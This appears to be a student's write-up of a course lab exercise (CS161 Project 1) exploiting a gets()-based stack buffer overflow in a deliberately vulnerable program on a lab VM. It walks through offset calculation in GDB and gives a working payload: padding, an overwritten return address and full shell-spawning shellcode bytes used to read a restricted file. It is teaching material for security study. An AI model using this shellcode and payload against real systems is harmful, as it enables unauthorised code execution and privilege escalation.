# Remus — Buffer Overflow Exploit (CS161 Project 1)

## Objective
Exploit a vulnerable C program (`orbit`) to gain elevated execution and read a protected `README` file.

---

## Environment
- Target: Vulnerable VM (`pwnable`)
- Access: SSH into `remus` user
- Files:
  - `orbit.c` — source code
  - `orbit` — compiled binary
  - `exploit` — wrapper script
  - `debug-exploit` — GDB wrapper
  - `README` — restricted file (goal)

---

## Vulnerability

The program uses:

```c
gets(buf);
```

This is vulnerable because:
- `gets()` does **not check input length**
- User input can overflow `buf`
- This allows overwriting adjacent stack memory

This is a classic buffer overflow vulnerability.

---

## Initial Observation

Running:

```bash
./exploit
```

and entering a long string (e.g. many `A`s) results in:

- Segmentation fault

This confirms:
> User input is overwriting critical memory (likely the return address)

---

## Stack Layout

From debugging, we infer:

```
[ buffer (buf) ]
[ padding ]
[ saved EBP ]
[ return address (EIP) ]
```

Goal:
- Overwrite the return address to point to attacker-controlled code

---

## Determining Offsets

Using GDB (`./debug-exploit`):

- Address of buffer: `0xbffffc18`
- Address of return pointer: `0xbffffc2c`

Offset:

```
0xbffffc2c - 0xbffffc18 = 20 bytes
```

So:
- First 20 bytes → fill buffer and reach return address

---

## Exploit Strategy

We construct input with three parts:

### 1. Padding

```python
"A" * 20
```

Fills buffer up to return address

---

### 2. Overwrite Return Address

We redirect execution to our shellcode.

Target address:
```
0xbffffc30
```

Encoded (little endian):

```python
"\x30\xfc\xff\xbf"
```

---

### 3. Shellcode

Provided shellcode spawns a shell:

```python
SHELLCODE = (
    '\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a'
    '\x47\x58\xcd\x80\x31\xc0\x50\x68\x2d\x69'
    '\x69\x69\x89\xe2\x50\x68\x2b\x6d\x6d\x6d'
    '\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f'
    '\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x89'
    '\xe1\x31\xd2\xb0\x0b\xcd\x80'
)
```

---

## Final Payload

```python
payload = (
    "A" * 20 +
    "\x30\xfc\xff\xbf" +
    SHELLCODE
)
```

---

## Execution

Running:

```bash
./exploit
```

If successful:
- A shell is spawned
- We can run:

```bash
cat README
```

to retrieve the next credentials

---

## Key Concepts Learned

- How unchecked input leads to memory corruption  
- How stack layout determines exploit structure  
- How to calculate offsets using GDB  
- How control flow can be redirected via return address overwrite  

---

## Takeaways

This exercise demonstrates how:
- A single unsafe function (`gets`) compromises program security  
- Memory safety violations translate directly into code execution  
- Exploitation follows a repeatable structure:
  - find overflow  
  - calculate offset  
  - redirect execution  

This forms the foundation for more complex exploitation tasks in later questions.